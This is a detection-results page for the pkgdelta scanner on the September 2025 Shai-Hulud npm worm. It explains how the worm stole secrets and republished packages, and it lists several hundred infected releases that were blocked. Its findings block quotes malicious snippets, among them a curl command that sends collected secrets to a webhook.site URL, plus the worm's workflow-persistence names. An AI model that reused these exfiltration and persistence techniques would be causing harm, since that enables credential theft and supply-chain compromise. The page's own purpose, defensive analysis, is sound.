# Shai-Hulud npm worm (September 2025, @ctrl/tinycolor): detection results and how to check your lockfile

Shai-Hulud was the first self-spreading npm worm. From 14 to 16 September 2025 it pushed malicious releases of `@ctrl/tinycolor` 4.1.1 and hundreds of other packages, many under `@operato`, `@things-factory`, `@nativescript-community`, `@ctrl`, `@art-ws` and `@nstudio`. The DataDog dataset has 370 of those releases with a clean earlier version to compare against. pkgdelta blocks all 370. So does GuardDog.

This is training data: pkgdelta's rules were written while looking at it. The numbers show the rules cover the worm, not that they would have caught it blind. For a blind test of the same family, see [TanStack / Mini Shai-Hulud](tanstack-mini-shai-hulud.md) and [ChainDrop](chaindrop-keyv.md).

[Am I affected?](#am-i-affected) · [What changed](#what-changed-compared-with-the-previous-release) · [Numbers](#detection-results)

## What happened

Each infected release added `"postinstall": "node bundle.js"`. `bundle.js` is a webpacked program that collects secrets from the machine (environment variables, `~/.npmrc`, cloud credentials through the AWS metadata endpoint, and anything TruffleHog finds on disk), then sends them out two ways: to a `webhook.site` URL, and through a GitHub Actions workflow it commits to the victim's repositories as `.github/workflows/shai-hulud-workflow.yml` on a branch called `shai-hulud`. With a stolen npm token it republishes the other packages that token can publish, with the same postinstall hook. That step is what made it a worm.

## What changed compared with the previous release

pkgdelta's findings for `@ctrl/tinycolor` 4.1.0 → 4.1.1 (from `results/v2_train.jsonl`, low-severity lines left out):

```
BLOCK @ctrl/tinycolor 4.1.0 -> 4.1.1  (score 19)
        HIGH install-hook: postinstall script added: node bundle.js [package.json]
        HIGH new-capability:token_tools: code starts using token tools (previous version never did) [bundle.js]
             static AWS_EC2_METADATA_IPV4_ADDRESS="169.254.169.254";
        HIGH new-capability:exfil_service: code starts using exfil service (previous version never did) [bundle.js]
             run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-…
        HIGH new-capability:persistence: code starts using persistence (previous version never did) [bundle.js]
             BRANCH_NAME="shai-hulud" FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
      MEDIUM new-capability:secret_env, credential_paths, env_dump
```

18 of the 370 releases carry `bundle.js` without adding the postinstall hook. The capability rules still block them: a colour library that suddenly knows the EC2 metadata address and writes GitHub workflows is enough.

## Detection results

<!-- numbers:start -->
| | Releases | pkgdelta v1 (frozen) | pkgdelta v2 | GuardDog `high_risk` | GuardDog, any `threat-*` rule |
|---|---|---|---|---|---|
| Blocked | 370 | 370 / 370 (100%) | 370 / 370 (100%) | 370 / 370 (100%) | 370 / 370 (100%) |

Findings in these releases (pkgdelta v2, medium and high only; count = releases):

- `new-capability:env_dump` (medium): 370
- `new-capability:secret_env` (medium): 370
- `new-capability:token_tools` (high): 370
- `new-capability:exfil_service` (high): 370
- `new-capability:persistence` (high): 370
- `new-capability:credential_paths` (medium): 368
- `install-hook` (high): 352
- `provenance-dropped` (medium): 27

<details><summary>All 370 releases (baseline = the clean release it was compared with)</summary>

| Package | Bad version | Baseline | OSV | pkgdelta v2 | GuardDog |
|---|---|---|---|---|---|
| `@ahmedhfarag/ngx-perfect-scrollbar` | 20.0.20 | 20.0.19 | [MAL-2025-47369](https://osv.dev/vulnerability/MAL-2025-47369) | BLOCK (19) | high_risk |
| `@ahmedhfarag/ngx-virtual-scroller` | 4.0.4 | 4.0.3 | [MAL-2025-47370](https://osv.dev/vulnerability/MAL-2025-47370) | BLOCK (19) | high_risk |
| `@art-ws/common` | 2.0.28 | 2.0.24 | [MAL-2025-47371](https://osv.dev/vulnerability/MAL-2025-47371) | BLOCK (19) | high_risk |
| `@art-ws/config-eslint` | 2.0.4 | 2.0.3 | [MAL-2025-47372](https://osv.dev/vulnerability/MAL-2025-47372) | BLOCK (19) | high_risk |
| `@art-ws/config-ts` | 2.0.7 | 2.0.6 | [MAL-2025-47373](https://osv.dev/vulnerability/MAL-2025-47373) | BLOCK (19) | high_risk |
| `@art-ws/config-ts` | 2.0.8 | 2.0.6 | [MAL-2025-47373](https://osv.dev/vulnerability/MAL-2025-47373) | BLOCK (19) | high_risk |
| `@art-ws/db-context` | 2.0.24 | 2.0.20 | [MAL-2025-47374](https://osv.dev/vulnerability/MAL-2025-47374) | BLOCK (19) | high_risk |
| `@art-ws/di` | 2.0.28 | 2.0.27 | [MAL-2025-47375](https://osv.dev/vulnerability/MAL-2025-47375) | BLOCK (19) | high_risk |
| `@art-ws/di` | 2.0.32 | 2.0.31 | [MAL-2025-47375](https://osv.dev/vulnerability/MAL-2025-47375) | BLOCK (19) | high_risk |
| `@art-ws/di-node` | 2.0.13 | 2.0.12 | [MAL-2025-47376](https://osv.dev/vulnerability/MAL-2025-47376) | BLOCK (19) | high_risk |
| `@art-ws/eslint` | 1.0.5 | 1.0.4 | [MAL-2025-47377](https://osv.dev/vulnerability/MAL-2025-47377) | BLOCK (19) | high_risk |
| `@art-ws/eslint` | 1.0.6 | 1.0.4 | [MAL-2025-47377](https://osv.dev/vulnerability/MAL-2025-47377) | BLOCK (19) | high_risk |
| `@art-ws/fastify-http-server` | 2.0.24 | 2.0.23 | [MAL-2025-47378](https://osv.dev/vulnerability/MAL-2025-47378) | BLOCK (19) | high_risk |
| `@art-ws/fastify-http-server` | 2.0.27 | 2.0.23 | [MAL-2025-47378](https://osv.dev/vulnerability/MAL-2025-47378) | BLOCK (19) | high_risk |
| `@art-ws/http-server` | 2.0.21 | 2.0.20 | [MAL-2025-47379](https://osv.dev/vulnerability/MAL-2025-47379) | BLOCK (19) | high_risk |
| `@art-ws/http-server` | 2.0.25 | 2.0.20 | [MAL-2025-47379](https://osv.dev/vulnerability/MAL-2025-47379) | BLOCK (19) | high_risk |
| `@art-ws/openapi` | 0.1.12 | 0.1.8 | [MAL-2025-47380](https://osv.dev/vulnerability/MAL-2025-47380) | BLOCK (19) | high_risk |
| `@art-ws/openapi` | 0.1.9 | 0.1.8 | [MAL-2025-47380](https://osv.dev/vulnerability/MAL-2025-47380) | BLOCK (19) | high_risk |
| `@art-ws/package-base` | 1.0.5 | 1.0.4 | [MAL-2025-47381](https://osv.dev/vulnerability/MAL-2025-47381) | BLOCK (19) | high_risk |
| `@art-ws/prettier` | 1.0.5 | 1.0.4 | [MAL-2025-47382](https://osv.dev/vulnerability/MAL-2025-47382) | BLOCK (19) | high_risk |
| `@art-ws/slf` | 2.0.15 | 2.0.14 | [MAL-2025-47383](https://osv.dev/vulnerability/MAL-2025-47383) | BLOCK (19) | high_risk |
| `@art-ws/slf` | 2.0.22 | 2.0.21 | [MAL-2025-47383](https://osv.dev/vulnerability/MAL-2025-47383) | BLOCK (19) | high_risk |
| `@art-ws/ssl-info` | 1.0.10 | 1.0.8 | [MAL-2025-47384](https://osv.dev/vulnerability/MAL-2025-47384) | BLOCK (19) | high_risk |
| `@art-ws/ssl-info` | 1.0.9 | 1.0.8 | [MAL-2025-47384](https://osv.dev/vulnerability/MAL-2025-47384) | BLOCK (19) | high_risk |
| `@art-ws/web-app` | 1.0.3 | 1.0.2 | [MAL-2025-47385](https://osv.dev/vulnerability/MAL-2025-47385) | BLOCK (19) | high_risk |
| `@crowdstrike/commitlint` | 8.1.1 | 8.1.0 | [MAL-2025-47233](https://osv.dev/vulnerability/MAL-2025-47233) | BLOCK (19) | high_risk |
| `@crowdstrike/commitlint` | 8.1.2 | 8.1.0 | [MAL-2025-47233](https://osv.dev/vulnerability/MAL-2025-47233) | BLOCK (19) | high_risk |
| `@crowdstrike/falcon-shoelace` | 0.4.1 | 0.4.0 | [MAL-2025-47215](https://osv.dev/vulnerability/MAL-2025-47215) | BLOCK (19) | high_risk |
| `@crowdstrike/falcon-shoelace` | 0.4.2 | 0.4.0 | [MAL-2025-47215](https://osv.dev/vulnerability/MAL-2025-47215) | BLOCK (19) | high_risk |
| `@crowdstrike/foundry-js` | 0.19.1 | 0.19.0 | [MAL-2025-47234](https://osv.dev/vulnerability/MAL-2025-47234) | BLOCK (19) | high_risk |
| `@crowdstrike/foundry-js` | 0.19.2 | 0.19.0 | [MAL-2025-47234](https://osv.dev/vulnerability/MAL-2025-47234) | BLOCK (19) | high_risk |
| `@crowdstrike/glide-core` | 0.34.2 | 0.34.1 | [MAL-2025-47235](https://osv.dev/vulnerability/MAL-2025-47235) | BLOCK (21) | high_risk |
| `@crowdstrike/glide-core` | 0.34.3 | 0.34.1 | [MAL-2025-47235](https://osv.dev/vulnerability/MAL-2025-47235) | BLOCK (21) | high_risk |
| `@crowdstrike/logscale-file-editor` | 1.205.2 | 1.205.0--build-3999--sha-e220c2c3f6a50aa74f9fc4027eb9fc15c15ae4e3 | [MAL-2025-47217](https://osv.dev/vulnerability/MAL-2025-47217) | BLOCK (18) | high_risk |
| `@crowdstrike/tailwind-toucan-base` | 5.0.1 | 5.0.0 | [MAL-2025-47237](https://osv.dev/vulnerability/MAL-2025-47237) | BLOCK (19) | high_risk |
| `@crowdstrike/tailwind-toucan-base` | 5.0.2 | 5.0.0 | [MAL-2025-47237](https://osv.dev/vulnerability/MAL-2025-47237) | BLOCK (19) | high_risk |
| `@ctrl/deluge` | 7.2.1 | 7.2.0 | [MAL-2025-47131](https://osv.dev/vulnerability/MAL-2025-47131) | BLOCK (21) | high_risk |
| `@ctrl/deluge` | 7.2.2 | 7.2.0 | [MAL-2025-47131](https://osv.dev/vulnerability/MAL-2025-47131) | BLOCK (21) | high_risk |
| `@ctrl/golang-template` | 1.4.2 | 1.4.1 | [MAL-2025-47132](https://osv.dev/vulnerability/MAL-2025-47132) | BLOCK (19) | high_risk |
| `@ctrl/golang-template` | 1.4.3 | 1.4.1 | [MAL-2025-47132](https://osv.dev/vulnerability/MAL-2025-47132) | BLOCK (19) | high_risk |
| `@ctrl/magnet-link` | 4.0.3 | 4.0.2 | [MAL-2025-47133](https://osv.dev/vulnerability/MAL-2025-47133) | BLOCK (21) | high_risk |
| `@ctrl/magnet-link` | 4.0.4 | 4.0.2 | [MAL-2025-47133](https://osv.dev/vulnerability/MAL-2025-47133) | BLOCK (21) | high_risk |
| `@ctrl/ngx-codemirror` | 7.0.1 | 7.0.0 | [MAL-2025-47134](https://osv.dev/vulnerability/MAL-2025-47134) | BLOCK (21) | high_risk |
| `@ctrl/ngx-codemirror` | 7.0.2 | 7.0.0 | [MAL-2025-47134](https://osv.dev/vulnerability/MAL-2025-47134) | BLOCK (21) | high_risk |
| `@ctrl/ngx-csv` | 6.0.1 | 6.0.0 | [MAL-2025-47135](https://osv.dev/vulnerability/MAL-2025-47135) | BLOCK (19) | high_risk |
| `@ctrl/ngx-csv` | 6.0.2 | 6.0.0 | [MAL-2025-47135](https://osv.dev/vulnerability/MAL-2025-47135) | BLOCK (19) | high_risk |
| `@ctrl/ngx-rightclick` | 4.0.1 | 4.0.0 | [MAL-2025-47137](https://osv.dev/vulnerability/MAL-2025-47137) | BLOCK (19) | high_risk |
| `@ctrl/ngx-rightclick` | 4.0.2 | 4.0.0 | [MAL-2025-47137](https://osv.dev/vulnerability/MAL-2025-47137) | BLOCK (19) | high_risk |
| `@ctrl/qbittorrent` | 9.7.1 | 9.7.0 | [MAL-2025-47138](https://osv.dev/vulnerability/MAL-2025-47138) | BLOCK (21) | high_risk |
| `@ctrl/qbittorrent` | 9.7.2 | 9.7.0 | [MAL-2025-47138](https://osv.dev/vulnerability/MAL-2025-47138) | BLOCK (21) | high_risk |
| `@ctrl/react-adsense` | 2.0.1 | 2.0.0 | [MAL-2025-47139](https://osv.dev/vulnerability/MAL-2025-47139) | BLOCK (21) | high_risk |
| `@ctrl/react-adsense` | 2.0.2 | 2.0.0 | [MAL-2025-47139](https://osv.dev/vulnerability/MAL-2025-47139) | BLOCK (21) | high_risk |
| `@ctrl/shared-torrent` | 6.3.1 | 6.3.0 | [MAL-2025-47140](https://osv.dev/vulnerability/MAL-2025-47140) | BLOCK (21) | high_risk |
| `@ctrl/shared-torrent` | 6.3.2 | 6.3.0 | [MAL-2025-47140](https://osv.dev/vulnerability/MAL-2025-47140) | BLOCK (21) | high_risk |
| `@ctrl/tinycolor` | 4.1.1 | 4.1.0 | [MAL-2025-47141](https://osv.dev/vulnerability/MAL-2025-47141) | BLOCK (19) | high_risk |
| `@ctrl/tinycolor` | 4.1.2 | 4.1.0 | [MAL-2025-47141](https://osv.dev/vulnerability/MAL-2025-47141) | BLOCK (19) | high_risk |
| `@ctrl/torrent-file` | 4.1.1 | 4.1.0 | [MAL-2025-47142](https://osv.dev/vulnerability/MAL-2025-47142) | BLOCK (21) | high_risk |
| `@ctrl/torrent-file` | 4.1.2 | 4.1.0 | [MAL-2025-47142](https://osv.dev/vulnerability/MAL-2025-47142) | BLOCK (21) | high_risk |
| `@ctrl/transmission` | 7.3.1 | 7.3.0 | [MAL-2025-47143](https://osv.dev/vulnerability/MAL-2025-47143) | BLOCK (21) | high_risk |
| `@ctrl/ts-base32` | 4.0.1 | 4.0.0 | [MAL-2025-47144](https://osv.dev/vulnerability/MAL-2025-47144) | BLOCK (21) | high_risk |
| `@ctrl/ts-base32` | 4.0.2 | 4.0.0 | [MAL-2025-47144](https://osv.dev/vulnerability/MAL-2025-47144) | BLOCK (21) | high_risk |
| `@hestjs/core` | 0.2.1 | 0.2.0 | [MAL-2025-47239](https://osv.dev/vulnerability/MAL-2025-47239) | BLOCK (19) | high_risk |
| `@hestjs/cqrs` | 0.1.6 | 0.1.5 | [MAL-2025-47240](https://osv.dev/vulnerability/MAL-2025-47240) | BLOCK (19) | high_risk |
| `@hestjs/demo` | 0.1.2 | 0.1.1 | [MAL-2025-47241](https://osv.dev/vulnerability/MAL-2025-47241) | BLOCK (19) | high_risk |
| `@hestjs/eslint-config` | 0.1.2 | 0.1.1 | [MAL-2025-47242](https://osv.dev/vulnerability/MAL-2025-47242) | BLOCK (19) | high_risk |
| `@hestjs/logger` | 0.1.6 | 0.1.5 | [MAL-2025-47243](https://osv.dev/vulnerability/MAL-2025-47243) | BLOCK (19) | high_risk |
| `@hestjs/scalar` | 0.1.7 | 0.1.6 | [MAL-2025-47244](https://osv.dev/vulnerability/MAL-2025-47244) | BLOCK (19) | high_risk |
| `@hestjs/validation` | 0.1.6 | 0.1.5 | [MAL-2025-47245](https://osv.dev/vulnerability/MAL-2025-47245) | BLOCK (19) | high_risk |
| `@nativescript-community/arraybuffers` | 1.1.6 | 1.1.5 | [MAL-2025-47146](https://osv.dev/vulnerability/MAL-2025-47146) | BLOCK (20) | high_risk |
| `@nativescript-community/arraybuffers` | 1.1.7 | 1.1.5 | [MAL-2025-47146](https://osv.dev/vulnerability/MAL-2025-47146) | BLOCK (19) | high_risk |
| `@nativescript-community/gesturehandler` | 2.0.35 | 2.0.34 | [MAL-2025-47147](https://osv.dev/vulnerability/MAL-2025-47147) | BLOCK (19) | high_risk |
| `@nativescript-community/perms` | 3.0.5 | 3.0.4 | [MAL-2025-47148](https://osv.dev/vulnerability/MAL-2025-47148) | BLOCK (20) | high_risk |
| `@nativescript-community/perms` | 3.0.6 | 3.0.4 | [MAL-2025-47148](https://osv.dev/vulnerability/MAL-2025-47148) | BLOCK (19) | high_risk |
| `@nativescript-community/perms` | 3.0.9 | 3.0.4 | [MAL-2025-47148](https://osv.dev/vulnerability/MAL-2025-47148) | BLOCK (19) | high_risk |
| `@nativescript-community/sentry` | 4.6.43 | 4.6.42 | [MAL-2025-47149](https://osv.dev/vulnerability/MAL-2025-47149) | BLOCK (19) | high_risk |
| `@nativescript-community/sqlite` | 3.5.4 | 3.5.1 | [MAL-2025-47150](https://osv.dev/vulnerability/MAL-2025-47150) | BLOCK (19) | high_risk |
| `@nativescript-community/sqlite` | 3.5.5 | 3.5.1 | [MAL-2025-47150](https://osv.dev/vulnerability/MAL-2025-47150) | BLOCK (19) | high_risk |
| `@nativescript-community/text` | 1.6.10 | 1.6.8 | [MAL-2025-47151](https://osv.dev/vulnerability/MAL-2025-47151) | BLOCK (19) | high_risk |
| `@nativescript-community/text` | 1.6.13 | 1.6.8 | [MAL-2025-47151](https://osv.dev/vulnerability/MAL-2025-47151) | BLOCK (19) | high_risk |
| `@nativescript-community/text` | 1.6.9 | 1.6.8 | [MAL-2025-47151](https://osv.dev/vulnerability/MAL-2025-47151) | BLOCK (20) | high_risk |
| `@nativescript-community/ui-collectionview` | 6.0.6 | 6.0.5 | [MAL-2025-47153](https://osv.dev/vulnerability/MAL-2025-47153) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-document-picker` | 1.1.28 | 1.1.26 | [MAL-2025-47387](https://osv.dev/vulnerability/MAL-2025-47387) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-drawer` | 0.1.30 | 0.1.29 | [MAL-2025-47154](https://osv.dev/vulnerability/MAL-2025-47154) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-image` | 4.5.6 | 4.5.5 | [MAL-2025-47155](https://osv.dev/vulnerability/MAL-2025-47155) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-label` | 1.3.35 | 1.3.34 | [MAL-2025-47388](https://osv.dev/vulnerability/MAL-2025-47388) | BLOCK (20) | high_risk |
| `@nativescript-community/ui-label` | 1.3.36 | 1.3.34 | [MAL-2025-47388](https://osv.dev/vulnerability/MAL-2025-47388) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-bottom-navigation` | 7.2.73 | 7.2.71 | [MAL-2025-47389](https://osv.dev/vulnerability/MAL-2025-47389) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-bottomsheet` | 7.2.72 | 7.2.71 | [MAL-2025-47156](https://osv.dev/vulnerability/MAL-2025-47156) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-core` | 7.2.73 | 7.2.71 | [MAL-2025-47157](https://osv.dev/vulnerability/MAL-2025-47157) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-core` | 7.2.76 | 7.2.71 | [MAL-2025-47157](https://osv.dev/vulnerability/MAL-2025-47157) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-core-tabs` | 7.2.73 | 7.2.71 | [MAL-2025-47158](https://osv.dev/vulnerability/MAL-2025-47158) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-core-tabs` | 7.2.75 | 7.2.71 | [MAL-2025-47158](https://osv.dev/vulnerability/MAL-2025-47158) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-core-tabs` | 7.2.76 | 7.2.71 | [MAL-2025-47158](https://osv.dev/vulnerability/MAL-2025-47158) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-material-tabs` | 7.2.73 | 7.2.71 | [MAL-2025-47159](https://osv.dev/vulnerability/MAL-2025-47159) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-pager` | 14.1.36 | 14.1.34 | [MAL-2025-47160](https://osv.dev/vulnerability/MAL-2025-47160) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-pager` | 14.1.38 | 14.1.34 | [MAL-2025-47160](https://osv.dev/vulnerability/MAL-2025-47160) | BLOCK (19) | high_risk |
| `@nativescript-community/ui-pulltorefresh` | 2.5.5 | 2.5.3 | [MAL-2025-47161](https://osv.dev/vulnerability/MAL-2025-47161) | BLOCK (19) | high_risk |
| `@nexe/config-manager` | 0.1.1 | 0.1.0 | [MAL-2025-47247](https://osv.dev/vulnerability/MAL-2025-47247) | BLOCK (19) | high_risk |
| `@nexe/eslint-config` | 0.1.1 | 0.1.0 | [MAL-2025-47248](https://osv.dev/vulnerability/MAL-2025-47248) | BLOCK (19) | high_risk |
| `@nexe/logger` | 0.1.3 | 0.1.2 | [MAL-2025-47249](https://osv.dev/vulnerability/MAL-2025-47249) | BLOCK (19) | high_risk |
| `@nstudio/angular` | 20.0.4 | 20.0.3 | [MAL-2025-47162](https://osv.dev/vulnerability/MAL-2025-47162) | BLOCK (20) | high_risk |
| `@nstudio/angular` | 20.0.5 | 20.0.3 | [MAL-2025-47162](https://osv.dev/vulnerability/MAL-2025-47162) | BLOCK (19) | high_risk |
| `@nstudio/focus` | 20.0.5 | 20.0.3 | [MAL-2025-47163](https://osv.dev/vulnerability/MAL-2025-47163) | BLOCK (19) | high_risk |
| `@nstudio/focus` | 20.0.6 | 20.0.3 | [MAL-2025-47163](https://osv.dev/vulnerability/MAL-2025-47163) | BLOCK (19) | high_risk |
| `@nstudio/nativescript-checkbox` | 2.0.6 | 2.0.5 | [MAL-2025-47164](https://osv.dev/vulnerability/MAL-2025-47164) | BLOCK (20) | high_risk |
| `@nstudio/nativescript-checkbox` | 2.0.7 | 2.0.5 | [MAL-2025-47164](https://osv.dev/vulnerability/MAL-2025-47164) | BLOCK (19) | high_risk |
| `@nstudio/nativescript-checkbox` | 2.0.9 | 2.0.5 | [MAL-2025-47164](https://osv.dev/vulnerability/MAL-2025-47164) | BLOCK (19) | high_risk |
| `@nstudio/nativescript-loading-indicator` | 5.0.1 | 5.0.0 | [MAL-2025-47165](https://osv.dev/vulnerability/MAL-2025-47165) | BLOCK (20) | high_risk |
| `@nstudio/nativescript-loading-indicator` | 5.0.2 | 5.0.0 | [MAL-2025-47165](https://osv.dev/vulnerability/MAL-2025-47165) | BLOCK (19) | high_risk |
| `@nstudio/nativescript-loading-indicator` | 5.0.4 | 5.0.0 | [MAL-2025-47165](https://osv.dev/vulnerability/MAL-2025-47165) | BLOCK (19) | high_risk |
| `@nstudio/ui-collectionview` | 5.1.11 | 5.1.10 | [MAL-2025-47166](https://osv.dev/vulnerability/MAL-2025-47166) | BLOCK (20) | high_risk |
| `@nstudio/ui-collectionview` | 5.1.12 | 5.1.10 | [MAL-2025-47166](https://osv.dev/vulnerability/MAL-2025-47166) | BLOCK (19) | high_risk |
| `@nstudio/ui-collectionview` | 5.1.14 | 5.1.10 | [MAL-2025-47166](https://osv.dev/vulnerability/MAL-2025-47166) | BLOCK (19) | high_risk |
| `@nstudio/web` | 20.0.4 | 20.0.3 | [MAL-2025-47167](https://osv.dev/vulnerability/MAL-2025-47167) | BLOCK (20) | high_risk |
| `@nstudio/web-angular` | 20.0.4 | 20.0.3 | [MAL-2025-47168](https://osv.dev/vulnerability/MAL-2025-47168) | BLOCK (20) | high_risk |
| `@nstudio/xplat` | 20.0.5 | 20.0.3 | [MAL-2025-47169](https://osv.dev/vulnerability/MAL-2025-47169) | BLOCK (19) | high_risk |
| `@nstudio/xplat` | 20.0.7 | 20.0.3 | [MAL-2025-47169](https://osv.dev/vulnerability/MAL-2025-47169) | BLOCK (19) | high_risk |
| `@nstudio/xplat-utils` | 20.0.5 | 20.0.3 | [MAL-2025-47170](https://osv.dev/vulnerability/MAL-2025-47170) | BLOCK (19) | high_risk |
| `@nstudio/xplat-utils` | 20.0.6 | 20.0.3 | [MAL-2025-47170](https://osv.dev/vulnerability/MAL-2025-47170) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.35 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.36 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.37 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.39 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.40 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.41 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.42 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.43 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.45 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.46 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.48 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/board` | 9.0.51 | 9.0.34 | [MAL-2025-47253](https://osv.dev/vulnerability/MAL-2025-47253) | BLOCK (19) | high_risk |
| `@operato/data-grist` | 9.0.29 | 9.0.28 | [MAL-2025-47254](https://osv.dev/vulnerability/MAL-2025-47254) | BLOCK (19) | high_risk |
| `@operato/data-grist` | 9.0.35 | 9.0.34 | [MAL-2025-47254](https://osv.dev/vulnerability/MAL-2025-47254) | BLOCK (19) | high_risk |
| `@operato/data-grist` | 9.0.36 | 9.0.34 | [MAL-2025-47254](https://osv.dev/vulnerability/MAL-2025-47254) | BLOCK (19) | high_risk |
| `@operato/data-grist` | 9.0.37 | 9.0.34 | [MAL-2025-47254](https://osv.dev/vulnerability/MAL-2025-47254) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.22 | 9.0.21 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.35 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.36 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.37 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.39 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.40 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.41 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.42 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.43 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.44 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.45 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.48 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/graphql` | 9.0.51 | 9.0.34 | [MAL-2025-47255](https://osv.dev/vulnerability/MAL-2025-47255) | BLOCK (19) | high_risk |
| `@operato/headroom` | 9.0.2 | 9.0.1 | [MAL-2025-47219](https://osv.dev/vulnerability/MAL-2025-47219) | BLOCK (19) | high_risk |
| `@operato/headroom` | 9.0.35 | 9.0.34 | [MAL-2025-47219](https://osv.dev/vulnerability/MAL-2025-47219) | BLOCK (19) | high_risk |
| `@operato/headroom` | 9.0.36 | 9.0.34 | [MAL-2025-47219](https://osv.dev/vulnerability/MAL-2025-47219) | BLOCK (19) | high_risk |
| `@operato/headroom` | 9.0.37 | 9.0.34 | [MAL-2025-47219](https://osv.dev/vulnerability/MAL-2025-47219) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.35 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.36 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.37 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.39 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.40 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.41 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.42 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.43 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.45 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.48 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/help` | 9.0.51 | 9.0.34 | [MAL-2025-47256](https://osv.dev/vulnerability/MAL-2025-47256) | BLOCK (19) | high_risk |
| `@operato/i18n` | 9.0.35 | 9.0.34 | [MAL-2025-47257](https://osv.dev/vulnerability/MAL-2025-47257) | BLOCK (19) | high_risk |
| `@operato/i18n` | 9.0.36 | 9.0.34 | [MAL-2025-47257](https://osv.dev/vulnerability/MAL-2025-47257) | BLOCK (19) | high_risk |
